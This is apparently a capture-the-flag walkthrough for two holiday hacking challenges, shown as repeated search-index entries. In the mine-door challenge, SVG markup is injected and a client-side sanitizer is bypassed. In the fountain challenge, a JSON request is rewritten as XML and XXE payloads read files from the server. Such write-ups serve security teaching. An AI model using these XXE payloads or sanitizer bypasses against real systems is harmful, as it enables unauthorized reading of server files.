\"pin.css\" > </ head > < body > < form method = 'post' action = 'pin6' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > As we have shown with Pins 1-3, the Content-Security-Policy really isn't a hinderance to us, but the sanitization script is. That is, it would if there were not a flaw in its implementation. The code specifies that the sanitization script should run when the onblur event triggers. This event occurs when focus is changed from the current element, in this case, the form field. This would happen when the [GO] button is clicked. However, the input can also be submitted by pressing enter while focus remains on the form field. This will submit the value to the server without triggering the onblur event, therefore the sanitization routine is never called. And while we cannot confirm it by inspecting the code, this method also works for Pin 6. The SVG code is a little more complicated for these pins as there are multiple colors, but with a little work something can be created that will work. Note that while the white, blue, and red SVG fill values match the colors of those pins, the value 'green' does not match the green used for the pin, so the explicit RGB value needs to be used instead. Pin 4 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"85\" fill=\"white\" /> <rect x=\"0\" y=\"85\" width=\"200\" height=\"85\" fill=\"blue\" /> </svg> Pin 5 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"70\" fill=\"red\" /> <rect x=\"0\" y=\"70\" width=\"10\" height=\"100\" fill=\"red\" /> <rect x=\"10\" y=\"70\" width=\"190\" height=\"100\" fill=\"blue\" /> </svg> Pin 6 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"50\" fill=\"#00ff00\" /> <rect x=\"0\" y=\"50\" width=\"200\" height=\"50\" fill=\"red\" /> <rect x=\"0\" y=\"100\" width=\"175\" height=\"70\" fill=\"blue\" /> <rect x=\"176\" y=\"100\" width=\"25\" height=\"70\" fill=\"red\" /> </svg> Part 2 Completion Hal Tandybuck Wha - what?? You opened all the locks?! Well then... Did you see the nearby terminal with evidence of an XXE attack? Maybe take a close look at that kind of thing.","title":"Open the Boria Mine Door"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#open-the-boria-mine-door","text":"Open Boria Mine Door Difficulty : Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.","title":"Open the Boria Mine Door"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#elf-introduction","text":"Hal Tandybuck Oh hi, I'm Hal Tandybuck. And who might you be? I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet. It actually reminds me of this locked crate I had three years ago... I doubt we'll get much in the way of debug output. Think you can help me get through?","title":"Elf Introduction"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#hints-and-resources","text":"Hints received from Alabaster Snowball after completing Boria PCAP Mining Lock Mechanism The locks take input, render some type of image, and process on the back end to unlock. To start, take a good look at the source HTML/JavaScript. Content Security-Policy Understanding how Content-Security-Policy works can help with this challenge. Input Validation Developers use both client- and server-side input validation to keep out naughty input. Other resources HTML SVG Graphics https://www.w3schools.com/html/html5_svg.asp Burp Suite Community Edition https://portswigger.net/burp/communitydownload","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#solution","text":"Opening the terminal next to Hal Tandybuck presents us with an instruction page telling us that we need to somehow connect the sensors for each pin using appropriate characters, then we are presented with 6 pins, the first 3 of which need to be opened in order to complete the challenge. Alabaster's first hint suggests that we inspect the source HTML / JavaScript, so either proxy the traffic through Burp Suite or open the browser Developer Tools and reload the page. Search the network traffic for requests for the URLs /pin1 - /pin6 and inspect the response to get the HTML source.","title":"Solution"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#pin-1","text":"The HTML source for the first pin is relatively straightforward, and provides us with an answer to solve the first one. Pin1 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < title > Lock 1 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin1' > <!-- @&@&&W&&W&&&& --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Here we see in the comment a character string that when entered into the pin will complete the circuit. Pin 1 Answer @&@&&W&&W&&&& At this point some experimentation is necessary to figure out what is going on. As it turns out, this is not the only way to open the first pin. Whatever characters you enter will be rendered as an HTML image, and so long as the characters touch in such a way that a path is created between the two pins the pin will open. Pin 1 Alternate Answer AAAAAAAAAAAAA","title":"Pin 1"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#pin-2","text":"The code for pin2 is identical to pin1, but adds a Content-Security-Policy. This policy will disallow the loading of styles or scripts from anywhere but the same site that the page is loading from, but will allow inline scripts. Pin2 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"default-src 'self';script-src 'self';style-src 'self' 'unsafe-inline'\" > < title > Lock 2 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin2' > <!-- TODO: FILTER OUT HTML FROM USER INPUT --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Now we just need to figure out a way to input something that when rendered into an HTML image will connect the lines. We could perhaps load an image from an external source, but an easier method is to generate an image using an HTML SVG (Scalable Vector Graphics) element. Inspecting the results from our first pin in Developer Tools we see that it created an image that is 200 x 170 pixels in size. So if we create a white square of this size using SVC it will complete the second pin. Pin 2 Answer <svg width=\"200\" height=\"170\"><rect width=\"100%\" height=\"100%\" fill=\"white\" /></svg>","title":"Pin 2"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#pin-3","text":"The only change in the source for Pin 3 removes the default-src 'self' directive from the Content-Security-Policy Pin 3 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self' 'unsafe-inline'; style-src 'self'\" > <!-- <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"> --> < title > Lock 3 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin3' > <!-- TODO: FILTER OUT JAVASCRIPT FROM USER INPUT --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > However, this doesn't affect the method that we used for Pin 2, so we can use the same code for Pin 3, noting however that this time the circuit ends are blue. Pin 3 Answer <svg width=\"200\" height=\"170\"><rect width=\"100%\" height=\"100%\" fill=\"blue\" /></svg>","title":"Pin 3"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#part-1-completion","text":"Hal Tandybuck Great! Thanks so much for your help! When you get to the fountain inside, there are some things you should consider. First, it might be helpful to focus on Glamtariel's CAPITALIZED words. If you finish those locks, I might just have another hint for you!","title":"Part 1 Completion"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#pins-4-5","text":"Pins 4-6 get a little more complicated. * Pin 4 includes a sanitization script that will disallow the use of the characters \" , ' , < , or > * Pin 5 has the same sanitization script as Pin 4, but also has a Content-Security-Policy * Pin 6 has only a policy, presumably performing the sanitization on the server Pin 4 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < title > Lock 4 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > < script > const sanitizeInput = () => { const input = document . querySelector ( '.inputTxt' ); const content = input . value ; input . value = content . replace ( /\"/ , '' ) . replace ( /'/ , '' ) . replace ( /</ , '' ) . replace ( />/ , '' ); } </ script > </ head > < body > < form method = 'post' action = 'pin4' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' onblur = 'sanitizeInput()' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Pin 5 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self' 'unsafe-inline'; style-src 'self'\" > < title > Lock 5 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > < script > const sanitizeInput = () => { const input = document . querySelector ( '.inputTxt' ); const content = input . value ; input . value = content . replace ( /\"/gi , '' ) . replace ( /'/gi , '' ) . replace ( /</gi , '' ) . replace ( />/gi , '' ); } </ script > </ head > < body > < form method = 'post' action = 'pin5' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' onblur = 'sanitizeInput()' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Pin 6 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self'; style-src 'self'\" > < title > Lock 6 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin6' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > As we have shown with Pins 1-3, the Content-Security-Policy really isn't a hinderance to us, but the sanitization script is. That is, it would if there were not a flaw in its implementation. The code specifies that the sanitization script should run when the onblur event triggers. This event occurs when focus is changed from the current element, in this case, the form field. This would happen when the [GO] button is clicked. However, the input can also be submitted by pressing enter while focus remains on the form field. This will submit the value to the server without triggering the onblur event, therefore the sanitization routine is never called. And while we cannot confirm it by inspecting the code, this method also works for Pin 6. The SVG code is a little more complicated for these pins as there are multiple colors, but with a little work something can be created that will work. Note that while the white, blue, and red SVG fill values match the colors of those pins, the value 'green' does not match the green used for the pin, so the explicit RGB value needs to be used instead. Pin 4 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"85\" fill=\"white\" /> <rect x=\"0\" y=\"85\" width=\"200\" height=\"85\" fill=\"blue\" /> </svg> Pin 5 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"70\" fill=\"red\" /> <rect x=\"0\" y=\"70\" width=\"10\" height=\"100\" fill=\"red\" /> <rect x=\"10\" y=\"70\" width=\"190\" height=\"100\" fill=\"blue\" /> </svg> Pin 6 Answer <svg width=\"200\" height=\"170\"> <rect x=\"0\" y=\"0\" width=\"200\" height=\"50\" fill=\"#00ff00\" /> <rect x=\"0\" y=\"50\" width=\"200\" height=\"50\" fill=\"red\" /> <rect x=\"0\" y=\"100\" width=\"175\" height=\"70\" fill=\"blue\" /> <rect x=\"176\" y=\"100\" width=\"25\" height=\"70\" fill=\"red\" /> </svg>","title":"Pins 4-5"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/#part-2-completion","text":"Hal Tandybuck Wha - what?? You opened all the locks?! Well then... Did you see the nearby terminal with evidence of an XXE attack? Maybe take a close look at that kind of thing.","title":"Part 2 Completion"},{"location":"quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/","text":"Glamtariel's Fountain Glamtariel's Fountain Difficulty : Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints. Hints and Resources Hint from Hal Tandybuck after completing Part 1 of the Boria Mine Door Significant Case Early parts of this challenge can be solved by focusing on Glamtariel's WORDS. Hint from Hal Tandybuck after completing Part 2 of the Boria Mine Door eXternal Entities Sometimes we can hit web pages with XXE when they aren't expecting it! Other Resources Guide on XXE Injection https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/ Burp Suite Community Edition https://portswigger.net/burp/communitydownload Setup Clicking on the fountain opens the web site https://glamtarielsfountain.com/ in a separate tab / window. The answer is submitted in your badge, so this challenge can be completed directly from this link at any time. When the web site opens it can be a little unclear what you are actually supposed to do. Each page of the site will have two main elements. The Princess The Fountain Additionally, there will be 4 objects that can be clicked and dragged onto either the princess or the fountain. Depending on which one is dragged where, the princess and the fountain will tell you different things. It's also possible to drop an object onto neither the princess or the fountain, but this will result in the same dialog no matter which object it is. The starting page has the following objects. Santa Candy Cane Elf Ice Cube All 9 dialog options for the first set of objects are provided in the table below. Object Dropped On Princess Fountain any empty space Some that are silver may never shine Some who wander may get lost All that are curious will eventually find What others have thrown away and tossed From water and cold new ice will form Frozen spires from lakes will arise Those shivering who weather the storm Will learn from how the TRAFFIC FLIES Santa Princess I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them. Glamtariel likes to keep Kringle happy so that he and the elves will visit often Santa Fountain Kringle really likes the cookies here so I always make them the same way Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses. Candycane Princess Mmmmm, I love Kringlish Delight! I think Glamtariel is thinking of a different story. Candycane Fountain I think fountain gets confused about things sometimes. Zany Zonka makes the best of these! Ice Cube Princess No worries, it doesn't get nearly as cold here as it did in Melgarexa. Brrrr, that was one frigid trip. I think it's a perfect temperature here. Ice Cube Fountain It's always great when old friends visit! Hey, its Chilly Icycube, my old friend! I remember when they were but a small drop in the Dimrofel. Elf Princess I helped the elves to create the PATH here to make sure that only those invited can find their way here I wish the elves visited more often. Elf Fountain I don't get away as much as I used to. I think I have one last trip in me which I've probably put off for far too long. The elves do a great job making PATHs which are easy to follow once you see them. Focusing on some of the dialog and especially the words in CAPS, we can deduce the following information from this first set of dialogs. TRAFFIC FLIES likely refers to us watching the web traffic to the site, implying that this will be necessary to complete the challenge Several references to TAMPER are made, with warnings that Santa would not like it if someone tampered with the Princesses cookie recipe. This is a hint that tampering with the site cookies is not advisable, and is in fact unnecessary to complete the challenge. PATH is telling us that at some point in the challenge we need to determine a directory path or similar After completing the first 8 dialog options, a new set of objects are provided Green Ring Igloo Ice Boat Star This time 8 dialog options are available, as the star gives the same regardless of which object it's dropped on. Object Dropped On Princess Fountain any empty space Some that are silver may never shine Some who wander may get lost All that are curious will eventually find What others have thrown away and tossed From water and cold new ice will form Frozen spires from lakes will arise Those shivering who weather the storm Will learn from how the TRAFFIC FLIES Green Ring Princess I do have a small ring collection, including one of these. I think Glamtariel likes rings a little more than she lets on sometimes. Green Ring Fountain Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed! Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye! Igloo Princess It's understandable to wonder about home when one is adventuring. I think I'd worry too much if I ever left this place. Igloo Fountain The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes. What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be? Ice Boat Princess These ice boat things would have been helpful back in the day. I still remember when Boregoth stole the Milsarils, very sad times. I'm glad I wasn't around for any of the early age scuffles. I shudder just thinking about the stories. Ice Boat Fountain Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though. I pretty much stick to just one TYPE of language, it's a lot easier to share things that way. Star either O Frostybreath Kelthonial shiny stars grace the night from heavens on high! Up and far many look away from glaciers cold. To Phenhelos they sing here in Kringle's realm! Note that when the Green Ring is dropped on the Fountain an eye appears in the middle of the screen which must be clicked to dismiss before anything else can be done. This has no effect or relevance that I could find on the rest of the challenge. The second page of dialogs tell us the following Again, we are told that we should look at how the TRAFFIC FLIES. This must be important. The princess mentions that she has a green ring in her collection. Again we are told that a PATH is involved, but this time along with an APP, inferring an application path of some sort. The fountain can be a poor guide for decisions The princess can speak in different TYPES of languages The fountain only uses one TYPE of language After completing this second set of dialogs, you will get the final page of the site with the last set of objects Two Blue Rings Silver Ring Red Ring Object Dropped On Princess Fountain Blue or Silver Ring empty space These are kind of special, please don't drop them just anywhere These are kind of special, please don't drop them just anywhere Red Ring empty space This is no small trinket, please don't drop it just anywhere This is no small trinket, please don't drop it just anywhere Blue Ring Princess I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty. If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though. Blue Ring Fountain I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things. Glamtariel can be pretty tight lipped about some things. Silver Ring Princess Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone. I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that. Silver Ring Fountain You know what one of my favorite songs is? Silver rings, silver rings .... Glamtariel may not have one of these silver rings in her collection, but I've overheard her talk about how much she'd like one someday. Red Ring Princess Ah, the fiery red ring! I'm definitely proud to have one of them in my collection. I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more. Red Ring Fountain Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one. You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently. From this last set of dialog we learn the following The princes keeps track of her rings in a RINGLIST that uses a SIMPLE FORMAT. The princess has 2 blue rings The princess has a red ring The princess doesn't have a silver ring in here collection, but she wants one. If we ask the princess about rings using a different TYPE of language, we may be more responsive. Solution Starting from one of the first clues, we want to watch the web traffic as we interact with the site. Stating Burp Suite we learn that every time an object is moved a POST request is sent to the /dropped URL, sending data using the JSON Content Type. { \"imgDrop\" : \"img1\" , \"who\" : \"princess\" , \"reqType\" : \"json\" } Some experimentation tells us that img1 is the top right object, img2 is the top left, img3 is the bottom right, and img4 is the bottom left. There was numerous mentions of TYPE in the dialogs, with indications that the princess can understand more than one. HTML POST requests can format the information submitted using several Content Types, but the most common are JSON and XML. We see from the data in the POST that it is using JSON, but what if we send the same data using the XML format? To do this, send the POST request to the Burp repeater, and modify it as follows. Change the Content-Type in the header to application/xml Change the content to the XML format <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <root> <imgDrop> img1 </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Inspecting the response packet we see different dialog from both the princess and the fountain. Object Dropped On Princess Fountain any princess I love rings of all colors! She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. any fountain I'm one of the few who can discuss anything using that TYPE of language. Yeah, I can understand a bit, but not communicate with it at all. The only thing we really learn from this is that the princess understands XML. Referring back to the hint from Hal Tandybuck, XML External Entity (XXE) Processing seems to be an option. This technique allows us to reference some external entity in our XML input, such as files on the local system. We've learned that an APP PATH is involved, and there is a RINGFILE in a SIMPLE FORMAT, so if we can deduce the name of a file we may be able to retrieve it using XXE. Looking at the web traffic again we see that image files representing the objects on the site that we can interact with are located in the directory /static/images . If we deduce that the web application is in a directory called APP, and that the file is RINGFILE.TXT, then the local file we want to access is /app/static/images/ringfile.txt . The following XML will use XXE to send this file to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain xxe princess Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this. She really does try to keep things safe. Best just to put it away. (click) In addition to the above dialog, we also have a value in the previously unused 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png,262px,100px , where we get the following image. This image references two files in the folder x_phial_pholder_2022 , bluering.txt and redring.txt . Next we use XXE to \"give\" these rings to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/bluering.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain bluering.txt princess I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty. She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. Note that this is the same dialog from when we dropped a blue ring on the princess though the web UI. Next, try the red ring. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/redring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain redring.txt princess Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice. Oooooh, I can just tell she'd like to talk about them some more. Not quite the same dialog as when we dropped the red ring on the princess through the web UI, but the fountain is encouraging us to continue. Remembering that the princess wants a silver ring, lets see if we can give her one. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain silverring.txt princess I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!. Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum! We also now have another value in the 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px , where we get the following image. Zooming in on this and rotating it we see the text goldring_to_be_deleted.txt , so we now give that to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain goldring_to_be_deleted.txt princess Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them. She's definitely hiding something. The princess tells us here that she thought we were going to give her the silver ring. She also makes reference to a REQ and TYPE. Noting that reqType is one of the parameters in the POST content, and the silver ring is image #1 on the web page, we create the following XML request. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop> img1 </imgDrop> <who> princess </who> <reqType> &xxe; </reqType> </root> Object Dropped On Princess Fountain silverring.txt princess No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations! Wow, I have never seen that before! She must really trust you! Along with the above dialog, we get the following URL reference in the 'visit' parameter. https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px Answer goldring-morethansupertopsecret76394734.png","title":"Glamtariel's Fountain"},{"location":"quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/#glamtariels-fountain","text":"Glamtariel's Fountain Difficulty : Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.","title":"Glamtariel's Fountain"},{"location":"quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/#hints-and-resources","text":"Hint from Hal Tandybuck after completing Part 1 of the Boria Mine Door Significant Case Early parts of this challenge can be solved by focusing on Glamtariel's WORDS. Hint from Hal Tandybuck after completing Part 2 of the Boria Mine Door eXternal Entities Sometimes we can hit web pages with XXE when they aren't expecting it! Other Resources Guide on XXE Injection https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/ Burp Suite Community Edition https://portswigger.net/burp/communitydownload","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/#setup","text":"Clicking on the fountain opens the web site https://glamtarielsfountain.com/ in a separate tab / window. The answer is submitted in your badge, so this challenge can be completed directly from this link at any time. When the web site opens it can be a little unclear what you are actually supposed to do. Each page of the site will have two main elements. The Princess The Fountain Additionally, there will be 4 objects that can be clicked and dragged onto either the princess or the fountain. Depending on which one is dragged where, the princess and the fountain will tell you different things. It's also possible to drop an object onto neither the princess or the fountain, but this will result in the same dialog no matter which object it is. The starting page has the following objects. Santa Candy Cane Elf Ice Cube All 9 dialog options for the first set of objects are provided in the table below. Object Dropped On Princess Fountain any empty space Some that are silver may never shine Some who wander may get lost All that are curious will eventually find What others have thrown away and tossed From water and cold new ice will form Frozen spires from lakes will arise Those shivering who weather the storm Will learn from how the TRAFFIC FLIES Santa Princess I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them. Glamtariel likes to keep Kringle happy so that he and the elves will visit often Santa Fountain Kringle really likes the cookies here so I always make them the same way Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses. Candycane Princess Mmmmm, I love Kringlish Delight! I think Glamtariel is thinking of a different story. Candycane Fountain I think fountain gets confused about things sometimes. Zany Zonka makes the best of these! Ice Cube Princess No worries, it doesn't get nearly as cold here as it did in Melgarexa. Brrrr, that was one frigid trip. I think it's a perfect temperature here. Ice Cube Fountain It's always great when old friends visit! Hey, its Chilly Icycube, my old friend! I remember when they were but a small drop in the Dimrofel. Elf Princess I helped the elves to create the PATH here to make sure that only those invited can find their way here I wish the elves visited more often. Elf Fountain I don't get away as much as I used to. I think I have one last trip in me which I've probably put off for far too long. The elves do a great job making PATHs which are easy to follow once you see them. Focusing on some of the dialog and especially the words in CAPS, we can deduce the following information from this first set of dialogs. TRAFFIC FLIES likely refers to us watching the web traffic to the site, implying that this will be necessary to complete the challenge Several references to TAMPER are made, with warnings that Santa would not like it if someone tampered with the Princesses cookie recipe. This is a hint that tampering with the site cookies is not advisable, and is in fact unnecessary to complete the challenge. PATH is telling us that at some point in the challenge we need to determine a directory path or similar After completing the first 8 dialog options, a new set of objects are provided Green Ring Igloo Ice Boat Star This time 8 dialog options are available, as the star gives the same regardless of which object it's dropped on. Object Dropped On Princess Fountain any empty space Some that are silver may never shine Some who wander may get lost All that are curious will eventually find What others have thrown away and tossed From water and cold new ice will form Frozen spires from lakes will arise Those shivering who weather the storm Will learn from how the TRAFFIC FLIES Green Ring Princess I do have a small ring collection, including one of these. I think Glamtariel likes rings a little more than she lets on sometimes. Green Ring Fountain Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed! Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye! Igloo Princess It's understandable to wonder about home when one is adventuring. I think I'd worry too much if I ever left this place. Igloo Fountain The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes. What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be? Ice Boat Princess These ice boat things would have been helpful back in the day. I still remember when Boregoth stole the Milsarils, very sad times. I'm glad I wasn't around for any of the early age scuffles. I shudder just thinking about the stories. Ice Boat Fountain Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though. I pretty much stick to just one TYPE of language, it's a lot easier to share things that way. Star either O Frostybreath Kelthonial shiny stars grace the night from heavens on high! Up and far many look away from glaciers cold. To Phenhelos they sing here in Kringle's realm! Note that when the Green Ring is dropped on the Fountain an eye appears in the middle of the screen which must be clicked to dismiss before anything else can be done. This has no effect or relevance that I could find on the rest of the challenge. The second page of dialogs tell us the following Again, we are told that we should look at how the TRAFFIC FLIES. This must be important. The princess mentions that she has a green ring in her collection. Again we are told that a PATH is involved, but this time along with an APP, inferring an application path of some sort. The fountain can be a poor guide for decisions The princess can speak in different TYPES of languages The fountain only uses one TYPE of language After completing this second set of dialogs, you will get the final page of the site with the last set of objects Two Blue Rings Silver Ring Red Ring Object Dropped On Princess Fountain Blue or Silver Ring empty space These are kind of special, please don't drop them just anywhere These are kind of special, please don't drop them just anywhere Red Ring empty space This is no small trinket, please don't drop it just anywhere This is no small trinket, please don't drop it just 